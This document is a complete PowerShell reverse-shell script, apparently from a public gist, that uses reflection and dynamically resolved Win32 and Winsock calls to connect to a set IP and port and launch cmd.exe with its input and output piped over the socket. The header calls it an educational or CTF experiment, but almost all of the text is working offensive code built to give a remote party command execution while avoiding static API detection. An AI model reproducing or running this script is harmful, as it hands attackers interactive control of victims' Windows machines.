<#
Source: https://gist.github.com/qtc-de/a87b2c97fd9e0330ad2dc67789a62ba5
DynWin32-ReverseShell.ps1 is a reverse shell based on dynamically looked up Win32 API calls.
The script uses reflection to obtain access to GetModuleHandle, GetProcAddress and CreateProcess.
Afterwards it uses GetModuleHandle and GetProcAddress to resolve the required WSA functions
from ws2_32.dll.

This script should be used for educational purposes only (and maybe while playing CTF :D).
It was only tested on Windows 10 (x64) and is probably not stable or portable. It's only
purpose is to demonstrate the usage of reflective lookups of Win32 API calls. See it as
just a silly experiment :)

Author: Tobias Neitzel (@qtc_de)
License: GPL-3.0 License

FAQ:
When you run a PowerShell script in a Windows environment, you have full access to the .NET Framework classes and methods.
PowerShell is based on .NET. This allows advanced .NET features, such as reflection, to be used directly within a .ps1 script.

In short, System.dll is not loaded explicitly in the script; it is already loaded as part of the .NET runtime.
The script simply uses reflection to access the types and methods already available in System.dll.
#>

$IP = "127.0.0.1"
$PORT = 4444

filter Get-Type ([string]$dllName,[string]$typeName)
{
    if( $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals($dllName) )
    {
        $_.GetType($typeName)
    }
}

function Get-Function
{
    Param(
        [string] $module,
        [string] $function
    )

    if( ($null -eq $GetModuleHandle) -or ($null -eq $GetProcAddress) )
    {
        throw "Error: GetModuleHandle and GetProcAddress must be initialized first!"
    }

    $moduleHandle = $GetModuleHandle.Invoke($null, @($module))
    $GetProcAddress.Invoke($null, @($moduleHandle, $function))
}

function Get-Delegate
{
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [IntPtr] $funcAddr,
        [Parameter(Position = 1, Mandatory = $True)] [Type[]] $argTypes,
        [Parameter(Position = 2)] [Type] $retType = [Void]
    )

    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('QD')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('QM', $false).
    DefineType('QT', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $argTypes).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retType, $argTypes).SetImplementationFlags('Runtime, Managed')
    $delegate = $type.CreateType()

    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($funcAddr, $delegate)
}

# Obtain the required types from the already loaded System.dll assembly
$assemblies = [AppDomain]::CurrentDomain.GetAssemblies()
$unsafeMethodsType = $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.UnsafeNativeMethods'
$nativeMethodsType = $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.NativeMethods'
$startupInformationType =  $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.NativeMethods+STARTUPINFO'
$processInformationType =  $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.SafeNativeMethods+PROCESS_INFORMATION'

# Obtain the methods: GetModuleHandle, GetProcAddress and CreateProcess
$GetModuleHandle = $unsafeMethodsType.GetMethod('GetModuleHandle')
$GetProcAddress = $unsafeMethodsType.GetMethod('GetProcAddress', [reflection.bindingflags]'Public,Static', $null, [System.Reflection.CallingConventions]::Any, @([System.IntPtr], [string]), $null);
$CreateProcess = $nativeMethodsType.GetMethod("CreateProcess")

# Dynamically lookup the required WSA function addresses from ws2_23.dll
$ConnectAddr = Get-Function "ws2_32.dll" "connect"
$WSASocketAddr = Get-Function "ws2_32.dll" "WSASocketA"
$WSAStartupAddr = Get-Function "ws2_32.dll" "WSAStartup"
$CloseSocketAddr = Get-Function "ws2_32.dll" "closesocket"

# Create delegate types for the dynamically looked up WSA function addresses
$CloseSocket = Get-Delegate $CloseSocketAddr @([IntPtr]) ([Int])
$WSAStartup = Get-Delegate $WSAStartupAddr @([Int16], [Byte[]]) ([Int])
$Connect = Get-Delegate $ConnectAddr @([IntPtr], [Byte[]], [Int]) ([Int])
$WSASocket = Get-Delegate $WSASocketAddr @([System.Net.Sockets.AddressFamily], [System.Net.Sockets.SocketType], [System.Net.Sockets.ProtocolType], [IntPtr], [UInt32], [Int]) ([IntPtr])

# Call WSAStartup to initialize WSA and create a WSA socket
$WSAStartup.Invoke(0x202, [System.Byte[]]::CreateInstance([System.Byte], 0x200))
$hSock = $WSASocket.Invoke([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Stream, [System.Net.Sockets.ProtocolType]::IP, [IntPtr]::Zero, 0, 0)

# Prepare the sockaddr_in structure in form of a byte array and use it to connect to the target
[Byte[]] $ip = [System.BitConverter]::GetBytes([System.Convert]::ToUInt32([ipaddress]::Parse($IP).Address))
[Byte[]] $port = [System.BitConverter]::GetBytes([System.Convert]::ToUInt16($PORT))
[Array]::Reverse($port)
[Byte[]] $buffer = 0x02, 0x00 + $port + $ip + 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00

$Connect.Invoke($hSock, $buffer, $buffer.Length)

# Create instances of the STARTUP_INFORMATION and PROCESS_INFORMATION structures
$startupInformation = $startupInformationType.GetConstructors().Invoke($null)
$processInformation = $processInformationType.GetConstructors().Invoke($null)

# Redirect stdin, stdout and stderr to the socket within of STARTUP_INFORMATION
$safeHandle = [Microsoft.Win32.SafeHandles.SafeFileHandle]::new($hSock, $true)
$startupInformation.dwFlags = 0x00000100
$startupInformation.hStdInput = $safeHandle
$startupInformation.hStdOutput = $safeHandle
$startupInformation.hStdError = $safeHandle

# Create a new cmd.exe process with redirected output as specified above
$cmd = [System.Text.StringBuilder]::new("C:\\Windows\\System32\\cmd.exe")
$CreateProcess.Invoke($null, @($null, $cmd, $null, $null, $true, 0x08000000, [IntPtr]::Zero, $null, $startupInformation, $processInformation))

# Finally close the socket handle that is owned by the script
$CloseSocket.Invoke($hSock)
